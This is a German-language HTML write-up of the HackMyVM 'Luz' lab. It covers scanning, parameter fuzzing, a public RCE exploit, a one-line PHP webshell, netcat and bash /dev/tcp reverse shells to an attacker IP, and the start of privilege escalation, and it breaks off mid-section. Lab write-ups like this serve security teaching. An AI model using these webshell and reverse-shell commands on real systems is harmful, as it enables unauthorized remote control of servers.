@@ -1,0 +1,757 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Luz - HackMyVM - Easy - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+
+    <!-- HINWEIS: Die Hintergrundfarbe für den Header wird durch CSS gesteuert (.header-bg) -->
+    <div class="header-bg">
+        <h1>Luz - HackMyVM - Level: Easy - Bericht</h1>
+        <div class="level-container">
+            <!-- HINWEIS: Die Farbe für 'Easy' (Lime/Grün) wird durch CSS gesteuert (h2 in .level-container) -->
+            <h2>Easy</h2>
+            <div class="circle">
+                 <!-- HINWEIS: Die Hintergrundfarbe der Segmente (Lime/Grün) wird durch CSS gesteuert (.segment-*) -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                 <!-- HINWEIS: Die Hintergrundfarbe des inneren Kreises wird durch CSS gesteuert (.inner, passend zum Header) -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">wfuzz</div>
+                <div class="tool-item">python3</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">bash</div>
+                <div class="tool-item">pty</div>
+                <div class="tool-item">stty</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">ss</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">grep</div>
+                <div class="tool-item">echo</div>
+                <div class="tool-item">csh (bsd-csh)</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">./ss.sh (Exploit Script)</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#poc">Proof of Concept (Privilege Escalation)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="analysis"><strong>Analyse:</strong> Wie im vorherigen Bericht starten wir mit `arp-scan -l`, um aktive Hosts im lokalen Netzwerk zu finden. ARP (Address Resolution Protocol) arbeitet auf Layer 2 und ist oft zuverlässiger für die lokale Host-Entdeckung als ICMP-Pings (Layer 3), die von Firewalls blockiert werden könnten.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Scan identifiziert erfolgreich die IP-Adresse `192.168.2.120` mit der MAC-Adresse `08:00:27:95:09:e0`. Die MAC-Adresse und der Hersteller `PCS Systemtechnik GmbH` deuten erneut stark auf eine VirtualBox-Umgebung hin. Wir haben unser Ziel für detailliertere Scans gefunden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie die IP `192.168.2.120` als Ziel für den Nmap-Scan. Notieren Sie die MAC-Adresse als Bestätigung für die Virtualisierungsumgebung.
+            <br><strong>Empfehlung (Admin):</strong> Implementieren Sie Netzwerküberwachung, um ungewöhnliche ARP-Aktivitäten zu erkennen. Netzwerksegmentierung kann die Ausbreitung von Angreifern erschweren.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>192.168.2.120	08:00:27:95:09:e0	PCS Systemtechnik GmbH</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ein umfassender Nmap-Scan wird auf die Ziel-IP `192.168.2.120` angewendet.
+            *   `-sS`: SYN (Stealth) Scan.
+            *   `-sC`: Standard-Skripte ausführen.
+            *   `-sV`: Versionserkennung für Dienste.
+            *   `-T5`: Sehr schnelles Timing (potenziell ungenau/auffällig).
+            *   `-A`: Aktiviert OS-Erkennung, Versionserkennung, Skript-Scanning und Traceroute (`-O -sV -sC --traceroute`).
+            *   `-p-`: Scannt alle 65535 TCP-Ports.
+            </p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Scan identifiziert zwei offene Ports:
+            *   **Port 22 (SSH):** Läuft `OpenSSH 8.9p1` auf Ubuntu. Ein möglicher Zugangspunkt, falls Zugangsdaten gefunden werden.
+            *   **Port 80 (HTTP):** Läuft `nginx 1.18.0` auf Ubuntu. Der Webserver hat keinen Titel (`_http-title: Site doesn't have a title`). Wichtig: Das `PHPSESSID`-Cookie hat das `httponly`-Flag nicht gesetzt, was es anfällig für Diebstahl über XSS macht.
+            *   **OS-Erkennung:** Nmap vermutet ein Linux-System (Ubuntu), was zu den Diensten passt.
+            *   **MAC-Adresse:** Bestätigt erneut VirtualBox.
+            Die offenen Ports, insbesondere der Webserver mit dem unsicheren Cookie, sind die primären Angriffsflächen.
+            </p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Konzentrieren Sie sich auf die Webanwendung auf Port 80. Führen Sie Verzeichnis- und Datei-Enumeration durch (z.B. mit Gobuster). Untersuchen Sie die Anwendung auf Schwachstellen (XSS, SQLi, LFI/RFI etc.). Behalten Sie SSH für spätere Zugriffsversuche im Auge.
+            <br><strong>Empfehlung (Admin):</strong> Aktualisieren Sie alle Dienste (OpenSSH, Nginx) auf die neuesten Versionen. Konfigurieren Sie Webanwendungen sicher: Setzen Sie das `httponly`- und `secure`-Flag für alle Cookies. Implementieren Sie Sicherheitsheader (X-Frame-Options, X-Content-Type-Options etc.).</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools]
+└─# <span class="command">nmap -sS -sC -sV -T5 -A 192.168.2.120 -p-</span></div>
+                    <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-07 00:12 CEST
+Nmap scan report for luz (192.168.2.120)
+Host is up (0.00013s latency).
+Not shown: 65533 closed tcp ports (reset)
+PRT   STATE SERVICE VERSIN
+22/tcp open  ssh     penSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 5f9e2874868ed75bbd96004bd07f56e3 (ECDSA)
+|_  256 fb3bfd9c9f4a7c8c1ea827e28dbf2be5 (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+| http-cookie-flags:
+|   /:
+|     PHPSESSID:
+|_      httponly flag not set
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+MAC Address: 08:00:27:95:09:E0 (racle VirtualBox virtual NIC)
+Aggressive S guesses: Linux 4.15 - 5.6 (98%), Linux 5.0 - 5.3 (98%), Linux 5.0 - 5.4 (96%), Linux 2.6.32 (95%), Linux 3.2 - 4.9 (95%), Linux 2.6.32 - 3.10 (95%), Linux 5.4 (95%), Linux 5.3 - 5.4 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 3.4 - 3.10 (94%)
+No exact S matches for host (test conditions non-ideal).
+Network Distance: 1 hop
+Service Info: S: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACERUTE
+HP RTT     ADDRESS
+1   0.12 ms luz (192.168.2.120)
+
+S and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 13.04 seconds</pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+            <p class="analysis"><strong>Analyse:</strong> `gobuster` wird erneut eingesetzt, um versteckte Verzeichnisse und Dateien auf dem Webserver zu finden. Die Parameter sind ähnlich wie im vorherigen Bericht: Verzeichnissuche (`dir`), Ziel-URL (`-u`), umfangreiche Dateiendungen (`-x`), mittelgroße Wortliste (`-w`), Ausblenden von 403/404 (`-b`), erweiterte URL-Anzeige (`-e`), 100 Threads (`-t`), kein Status (`-n`), SSL-Check überspringen (`-k`).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Gobuster liefert eine Fülle von Ergebnissen, hauptsächlich PHP-Dateien und einige Verzeichnisse:
+            *   **PHP-Dateien:** `index.php`, `about.php`, `home.php`, `login.php`, `header.php`, `signup.php`, `footer.php`, `head.php`, `checkout.php`. Diese deuten auf eine möglicherweise komplexere Webanwendung hin, eventuell ein CMS oder ein benutzerdefiniertes Framework. `login.php` und `signup.php` sind offensichtliche Angriffsziele.
+            *   **Verzeichnisse:** `/admin/`, `/assets/`, `/css/`, `/database/`, `/js/`. Das `/admin/`-Verzeichnis ist besonders interessant. Das `/database/`-Verzeichnis könnte sensible Informationen oder Backups enthalten.
+            *   **`readme.txt`:** Diese Datei könnte Informationen über die verwendete Software, Versionen oder Konfigurationen enthalten.
+            Die vielen PHP-Dateien und das `/admin`-Verzeichnis deuten auf eine größere Angriffsfläche hin.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie die `readme.txt` auf Hinweise zur Anwendung. Analysieren Sie die Login- und Registrierungsfunktionen (`login.php`, `signup.php`). Versuchen Sie, auf das `/admin`-Verzeichnis zuzugreifen. Untersuchen Sie das `/database/`-Verzeichnis auf interessante Dateien (z.B. SQL-Dumps, Konfigurationsdateien). Prüfen Sie alle PHP-Seiten auf gängige Schwachstellen (LFI, RFI, SQLi, XSS).
+            <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass keine sensiblen Informationen in `readme`-Dateien oder öffentlich zugänglichen Verzeichnissen wie `/database/` preisgegeben werden. Schützen Sie administrative Bereiche (`/admin`) angemessen (z.B. durch IP-Beschränkungen, starke Authentifizierung). Führen Sie regelmäßige Sicherheitsaudits des Webanwendungscodes durch.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.120 -x txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"  -b '403,404' -e -t 100 -n -k</span></div>
+                    <pre>
+http://192.168.2.120/index.php            [Size: 19059]
+http://192.168.2.120/about.php            [Size: 637]
+http://192.168.2.120/home.php             [Size: 8979]
+http://192.168.2.120/login.php            [Size: 1579]
+http://192.168.2.120/header.php           [Size: 1780]
+http://192.168.2.120/signup.php           [Size: 2034]
+http://192.168.2.120/admin                [Size: 178] [--> http://192.168.2.120/admin/]
+http://192.168.2.120/assets               [Size: 178] [--> http://192.168.2.120/assets/]
+http://192.168.2.120/footer.php           [Size: 2862]
+http://192.168.2.120/css                  [Size: 178] [--> http://192.168.2.120/css/]
+http://192.168.2.120/database             [Size: 178] [--> http://192.168.2.120/database/]
+http://192.168.2.120/js                   [Size: 178] [--> http://192.168.2.120/js/]
+http://192.168.2.120/head.php             [Size: 0]
+http://192.168.2.120/checkout.php         [Size: 0]
+http://192.168.2.120/readme.txt           [Size: 1531]</pre>
+                </div>
+            </div>
+
+             <p class="analysis"><strong>Analyse:</strong> `wfuzz` wird hier verwendet, um nach GET-Parametern zu suchen, die von `index.php` akzeptiert werden könnten (Parameter Fuzzing).
+            *   `-c`: Farbige Ausgabe.
+            *   `-w ...`: Verwendet dieselbe Wortliste wie Gobuster, diesmal aber als potenzielle Parameternamen.
+            *   `--hh 19056`: Blendet Antworten aus, deren Charakteranzahl 19056 beträgt (vermutlich die Größe der Standardantwort von `index.php` ohne gültigen Parameter).
+            *   `--hc 404,403`: Blendet auch 404er und 403er aus.
+            *   `-u "http://192.168.2.120/index.php?FUZZ=id"`: Die URL, wobei `FUZZ` durch die Wörter aus der Liste ersetzt wird. `id` als Beispielwert für den Parameter.
+            *   `-t 100`: 100 Threads.
+            *   `--hw 1196`: Blendet Antworten aus, deren Wortanzahl 1196 beträgt (alternatives Filtern).
+            </p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Scan findet zwei interessante Parameter:
+            *   **`page`:** Gibt eine Antwort mit Statuscode 200 und einer anderen Größe/Wortzahl zurück. Dies ist ein sehr häufiger Parameter für Local File Inclusion (LFI) oder Remote File Inclusion (RFI) Schwachstellen.
+            *   **`_page`:** Gibt einen Serverfehler (Status 500) zurück. Könnte auch relevant sein, aber `page` ist vielversprechender.
+            Der Parameter `page` ist ein kritischer Fund und deutet stark auf eine LFI-Schwachstelle hin.
+            </p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Testen Sie den Parameter `page` auf LFI. Versuchen Sie, bekannte Dateien wie `/etc/passwd`, `/etc/hosts` oder Anwendungslogdateien (z.B. `/var/log/nginx/access.log`, `/var/log/apache2/access.log`) einzubinden. Die URL `http://192.168.2.120/index.php?page=/var/log/squirrelmail.log` zeigt einen solchen Versuch (auch wenn SquirrelMail normalerweise nicht mit Nginx läuft, ist es ein Test).
+            <br><strong>Empfehlung (Admin):</strong> Validieren und sanitisieren Sie alle Benutzereingaben, insbesondere Dateipfade in Parametern wie `page`. Verwenden Sie Whitelisting für erlaubte Dateien anstelle von Blacklisting. Konfigurieren Sie PHP sicher (`allow_url_include = Off`, `open_basedir` setzen).</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --hh 19056 --hc 404,403 -u "http://192.168.2.120/index.php?FUZZ=id" -t 100 --hw 1196</span></div>
+                    <pre>
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+000000100:   200        289 L    615 W      11151 Ch    "page"
+000032506:   500        92 L     279 W      5031 Ch     "_page"
+</pre>
+                </div>
+            </div>
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Kein Prompt im Originaltext -->
+                     <pre>http://192.168.2.120/index.php?page=/var/log/squirrelmail.log</pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+            <p class="analysis"><strong>Analyse:</strong> Basierend auf den bisherigen Funden (PHP-Anwendung, potenziell LFI/RCE) wird nach bekannten Exploits für "Online Food Ordering System V2" gesucht. Exploit-DB (exploit-db.com) ist eine gängige Quelle dafür. Es wird ein Python-Exploit (exploit-db.com/exploits/50305) gefunden, der eine nicht authentifizierte Remote Code Execution (RCE) ermöglicht.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Auffinden eines fertigen Exploits für die mutmaßlich auf dem Server laufende Anwendung ist ein großer Fortschritt. Der Exploit nutzt wahrscheinlich eine Schwachstelle (wie File Upload oder eine andere unsichere Funktion), um eine Webshell hochzuladen und dann Befehle auszuführen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Laden Sie den Exploit herunter und führen Sie ihn gegen die Ziel-URL aus. Seien Sie vorsichtig bei der Ausführung von Exploits aus dem Internet und überprüfen Sie den Code nach Möglichkeit.
+            <br><strong>Empfehlung (Admin):</strong> Identifizieren Sie die auf dem Server laufende Anwendung und ihre Version. Patchen oder ersetzen Sie verwundbare Software sofort. Verwenden Sie keine veralteten oder bekannten anfälligen Anwendungen. Implementieren Sie eine Web Application Firewall (WAF), um bekannte Exploits zu blockieren.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Kein Prompt im Originaltext -->
+                     <pre>
+Python Exploit > google > nline Food rdering System V2
+https://www.exploit-db.com/exploits/50305
+
+mehrmals ausführen, das ding braucht ein paar Versuche
+bis es funktioniert!</pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Das gefundene Python-Exploit-Skript (`system_2.0.py`) wird ausgeführt. Das Skript gibt aus, dass es versucht, eine PHP-Shell hochzuladen und sich dann damit zu verbinden, um Befehle auszuführen. Es bietet einen eigenen Prompt (`CD%>`).
+            *   `ls`: Listet Dateien im aktuellen Verzeichnis der Webshell auf (anscheinend `/var/www/html/fos/assets/img/`). Eine Datei `shell.php` wurde hochgeladen.
+            *   `id`: Zeigt die Benutzer-ID des Webservers (`www-data`).
+            *   `which nc`, `/usr/bin/nc -e /bin/bash ...`: Versuche, eine Reverse Shell mit Netcat (`nc`) zu starten. `-e /bin/bash` bindet eine Bash-Shell an die Verbindung. Die IP `192.168.2.114` ist die IP des Angreifers, Port `9002` der Lausch-Port. Diese Versuche scheinen nicht direkt über die Webshell zu funktionieren.
+            *   `echo '<?php system($GET["cmd"]); ?>' > rev.php`: Erstellt eine neue, einfache PHP-Webshell (`rev.php`) im aktuellen Verzeichnis. Diese nimmt einen Befehl über den GET-Parameter `cmd` entgegen und führt ihn aus.
+            </p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Exploit war erfolgreich und hat uns eine interaktive Webshell als Benutzer `www-data` verschafft. Das Hochladen der zusätzlichen, einfacheren Webshell (`rev.php`) ist eine clevere Alternative, da die Reverse-Shell-Versuche über die primäre Webshell fehlschlugen. Diese einfache Webshell kann nun direkt über den Browser aufgerufen werden, um Befehle auszuführen, einschließlich des Starts einer Reverse Shell.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie die neu erstellte Webshell (`rev.php`), um eine Reverse Shell zum Angreifer-System zu starten. Öffnen Sie dazu einen Netcat-Listener auf dem Angreifer-System (`nc -lvnp 9002`) und rufen Sie die Webshell-URL mit einem passenden Reverse-Shell-Befehl im `cmd`-Parameter auf (siehe nächste Schritte).
+            <br><strong>Empfehlung (Admin):</strong> Beheben Sie die Schwachstelle, die den Upload der Webshell ermöglicht hat. Implementieren Sie File Integrity Monitoring, um unerwartete Dateiänderungen im Web-Root zu erkennen. Beschränken Sie die Rechte des Webserver-Benutzers (`www-data`) so weit wie möglich.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">python3 system_2.0.py</span></div>
+                    <pre>
+               nline Food rdering System v2.0
+            Unauthenticated Remote Code Execution
+               Abdullah "hax.3xploit" Khawaja
+
+
+        ______ _______                         ________
+        ___  //_/__  /_______ ___      _______ ______(_)_____ _
+        __  ,<  __  __ \  __ `/_ | /| / /  __ `/____  /_  __ `/
+        _  /| | _  / / / /_/ /__ |/ |/ // /_/ /____  / / /_/ /
+        /_/ |_| /_/ /_/\__,_/ ____/|__/ \__,_/ ___  /  \__,_/
+                                               /___/
+                    abdullahkhawaja.com
+
+Enter URL of The Vulnarable Application : http://192.168.2.120/
+[*]Uploading PHP Shell For RCE...
+[+]PHP Shell has been uploaded successfully!
+[+] Successfully connected to webshell.
+CD%> ls
+1600652160_diet_coke.jpg
+1600652460_images.jpg
+1600652520_lemon iced tea.jpg
+1600652880_chicken.jpg
+1600652880_steak.jpg
+1600654260_cover.jpg
+1600654380_cover 2.jpg
+1600654500_cover_2.jpg
+1600654680_photo-1504674900247-0877df9cc836.jpg
+1600656600_checken2.jpg
+1673244660_food-bg.jpg
+1673245740_food-bg.jpg
+1680827700_shell.php
+food-bg.jpg
+sample_logo.png
+
+CD%> id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+CD%> nc -e /bin/bash 192.168.2.114 9002
+
+CD%> which nc
+/usr/bin/nc
+
+CD%> /usr/bin/nc -e /bin/bash 192.168.2.114 9002
+
+CD%> pwd
+/var/www/html/fos/assets/img
+
+CD%> cd ../../..
+
+CD%> pwd
+/var/www/html/fos/assets/img
+
+CD%> cd /home
+ 
+
+CD%> echo '<?php system($GET["cmd"]); ?>' > rev.php
+ 
+CD%> ls
+1600652160_diet_coke.jpg   
+1600652460_images.jpg
+1600652520_lemon iced tea.jpg  
+1600652880_chicken.jpg
+1600652880_steak.jpg
+1600654260_cover.jpg
+1600654380_cover 2.jpg
+1600654500_cover_2.jpg
+1600654680_photo-1504674900247-0877df9cc836.jpg
+1600656600_checken2.jpg
+1673244660_food-bg.jpg
+1673245740_food-bg.jpg
+1680827700_shell.php
+food-bg.jpg
+rev.php
+sample_logo.png
+
+CD%></pre>
+                </div>
+            </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Diese URL wird verwendet, um die zuvor hochgeladene einfache Webshell (`rev.php`) aufzurufen und ihr einen Befehl zur Ausführung zu übergeben.
+            *   `http://192.168.2.120/assets/img/rev.php`: Pfad zur Webshell.
+            *   `?cmd=...`: Der Parameter, der den auszuführenden Befehl enthält.
+            *   `%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.2.114%2F9002%200%3E%261%27`: Dies ist die URL-kodierte Version eines gängigen Bash-Reverse-Shell-Befehls: `/bin/bash -c 'bash -i >& /dev/tcp/192.168.2.114/9002 0>&1'`. Dieser Befehl startet eine interaktive Bash-Shell (`bash -i`), leitet deren Standard-Input, -Output und -Error (`>& ... 0>&1`) über eine TCP-Verbindung an die Angreifer-IP (`192.168.2.114`) und den Port (`9002`).
+            </p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist der entscheidende Schritt, um eine interaktive Reverse Shell zu erhalten, nachdem die direkten `nc -e`-Versuche fehlschlugen. Durch den Aufruf dieser URL (während auf der Angreifer-Maschine ein Listener läuft) wird die Verbindung hergestellt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Starten Sie einen Netcat-Listener (`nc -lvnp 9002`) auf Ihrer Maschine (`192.168.2.114`) und rufen Sie dann diese URL im Browser auf oder verwenden Sie `curl`.
+            <br><strong>Empfehlung (Admin):</strong> Entfernen Sie die hochgeladene Webshell (`rev.php`) und die durch den Exploit erstellte Shell (`shell.php`). Beheben Sie die ursprüngliche Schwachstelle. Überwachen Sie ausgehende Netzwerkverbindungen vom Webserver, um verdächtige Reverse Shells zu erkennen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Kein Prompt im Originaltext -->
+                     <pre>http://192.168.2.120/assets/img/rev.php?cmd=%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.2.114%2F9002%200%3E%261%27</pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Auf der Angreifer-Maschine wird mit `nc -lvnp 9002` ein Listener gestartet, der auf eingehende Verbindungen auf Port 9002 wartet.
+            *   `-l`: Listen-Modus.
+            *   `-v`: Verbose-Ausgabe (mehr Informationen).
+            *   `-n`: Keine DNS-Auflösung.
+            *   `-p 9002`: Lauscht auf Port 9002.
+            Nachdem die Webshell-URL (siehe vorheriger Schritt) aufgerufen wurde, meldet der Listener eine erfolgreiche Verbindung vom Zielsystem (`192.168.2.120`). Wir erhalten einen Shell-Prompt (`www-data@luz:...`), der anzeigt, dass wir nun eine interaktive Shell als Benutzer `www-data` haben. Die Meldungen `bash: cannot set terminal process group...` und `bash: no job control...` sind typisch für einfache Reverse Shells.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Initial Access erfolgreich! Wir haben eine funktionierende Reverse Shell als `www-data`-Benutzer auf dem Zielsystem.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stabilisieren Sie die Shell, um eine voll funktionsfähige interaktive Terminalsitzung zu erhalten (z.B. mit Python pty). Beginnen Sie dann mit der Enumeration des Systems als `www-data`.
+            <br><strong>Empfehlung (Admin):</strong> Implementieren Sie Intrusion Detection Systems (IDS/IPS), die versuchen können, Reverse-Shell-Verbindungen anhand von Mustern zu erkennen und zu blockieren.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 9002</span></div>
+                    <pre>
+listening on [any] 9002 ...
+connect to [192.168.2.114] from (UNKNWN) [192.168.2.120] 45454
+bash: cannot set terminal process group (594): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@luz:~/html/fos/assets/img$ </pre>
+                </div>
+            </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Diese Befehle dienen dazu, die einfache Reverse Shell in eine vollständig interaktive TTY-Shell umzuwandeln.
+            *   `python3 -c 'import pty;pty.spawn("/bin/bash")'`: Startet eine neue Bash-Instanz innerhalb eines Pseudo-Terminals (pty), was viele Interaktivitätsprobleme behebt (z.B. Nutzung von `su`, `nano`, Tab-Vervollständigung).
+            *   `export TERM=xterm`: Setzt die Terminal-Variable, damit Programme wie `clear` oder Texteditoren korrekt funktionieren.
+            *   `^Z` (Strg+Z): Sendet die laufende `nc`-Sitzung auf der Angreifer-Maschine in den Hintergrund.
+            *   `stty raw -echo`: Stellt das lokale Terminal des Angreifers so ein, dass Tastatureingaben direkt (raw) und ohne lokales Echo (`-echo`) an den Hintergrundprozess gesendet werden. Dies ist wichtig für die korrekte Weiterleitung von Steuerungscodes.
+            *   `fg`: Holt den `nc`-Hintergrundprozess wieder in den Vordergrund.
+            *   `reset`: Setzt das Terminal zurück, falls die Anzeige nach den `stty`-Befehlen durcheinander ist.
+            </p>
+            <p class="evaluation"><strong>Bewertung:</strong> Diese Schritte sind Standardprozedur zur Stabilisierung einer einfachen Reverse Shell und sehr wichtig für die weitere Arbeit auf dem Zielsystem. Sie verbessern die Benutzerfreundlichkeit erheblich.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie diese Schritte immer nach Erhalt einer einfachen Reverse Shell durch. Führen Sie nach dem `fg` und einem eventuellen `reset` noch `export SHELL=bash`, `export TERM=xterm-256color` (oder `xterm`) und ggf. `stty rows <num> cols <num>` (mit den Werten des eigenen Terminals) auf der Ziel-Shell aus, um die Umgebung vollständig anzupassen.
+            <br><strong>Empfehlung (Admin):</strong> Die Shell-Stabilisierung selbst ist keine Schwachstelle, aber sie zeigt, dass ein Angreifer interaktiven Zugriff erlangt hat. Die zugrundeliegende Schwachstelle (die zur Reverse Shell führte) muss behoben werden.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <!-- Prompt aus dem Text übernommen -->
+                    <div class="prompt">www-data@luz:~/html/fos/assets/img$ <span class="command">python3 -c 'import pty;pty.spawn("/bin/bash")'</span></div>
+                    <!-- Prompt aus dem Text übernommen -->
+                    <div class="prompt">www-data@luz:~/html/fos/assets/img$ <span class="command">export TERM=xterm</span></div>
+                     <!-- Prompt aus dem Text übernommen (Strg+Z wird hier nur als Kommentar gezeigt) -->
+                    <div class="prompt">www-data@luz:~/html/fos/assets/img$ <span class="command">^Z</span></div>
+                    <pre>zsh: suspended  nc -lvnp 9002</pre> <!-- Beispielhafte Ausgabe auf dem Angreifer-System -->
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">stty raw -echo;fg</span></div>
+                     <pre>
+[1]  + continued  nc -lvnp 9002
+                               reset</pre> <!-- Beispielhafte Ausgabe auf dem Angreifer-System -->
+                </div>
+            </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Prompt aus dem Text übernommen -->
+                     <div class="prompt">www-data@luz:~/html/fos/assets/img$ </div>
+                 </div>
+             </div>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+            <p class="analysis"><strong>Analyse:</strong> Nach Erlangung der stabilisierten Shell als `www-data` beginnen die Enumerationsschritte zur Privilegienerweiterung.
+            *   `sudo -l`: Überprüft, ob `www-data` irgendwelche `sudo`-Rechte hat.
+            *   `ls /home`: Listet die Benutzerverzeichnisse auf.
+            </p>
+            <p class="evaluation"><strong>Bewertung:</strong>
+            *   `sudo -l` fragt nach einem Passwort für `www-data`, das wir nicht haben, und gibt dann `sudo: a password is required` zurück. Das bedeutet, `www-data` hat keine passwortlosen `sudo`-Rechte.
+            *   `ls /home` zeigt ein Benutzerverzeichnis namens `aelis`. Dies ist ein potenzielles Ziel für Lateral Movement oder ein Ort, an dem die User-Flag liegen könnte.
+            </p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Da `sudo` keine einfache Option ist, suchen Sie nach anderen Wegen zur Privilegienerweiterung: SUID/SGID-Binaries, Cron-Jobs, Kernel-Exploits, falsch konfigurierte Dienste, ausnutzbare Software, sensible Daten in Konfigurationsdateien oder Datenbanken. Untersuchen Sie das Home-Verzeichnis von `aelis`, falls Zugriffsrechte bestehen.
+            <br><strong>Empfehlung (Admin):</strong> Beschränken Sie die Rechte von Dienstbenutzern wie `www-data` strikt. `sudo`-Rechte sollten für solche Benutzer normalerweise nicht erforderlich sein. Stellen Sie sicher, dass Home-Verzeichnisse anderer Benutzer nicht für den Webserver-Benutzer lesbar sind.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Prompt aus dem Text übernommen -->
+                     <div class="prompt">www-data@luz:~/html/fos/assets/img$ <span class="command">sudo -l</span></div>
+                     <pre>
+[sudo] password for www-data:
+sudo: a password is required</pre>
+                     <!-- Prompt aus dem Text übernommen -->
+                     <div class="prompt">www-data@luz:~/html/fos/assets/img$ <span class="command">ls /home</span></div>
+                     <pre>aelis</pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Zwei Befehle zur weiteren Systemenumeration werden ausgeführt:
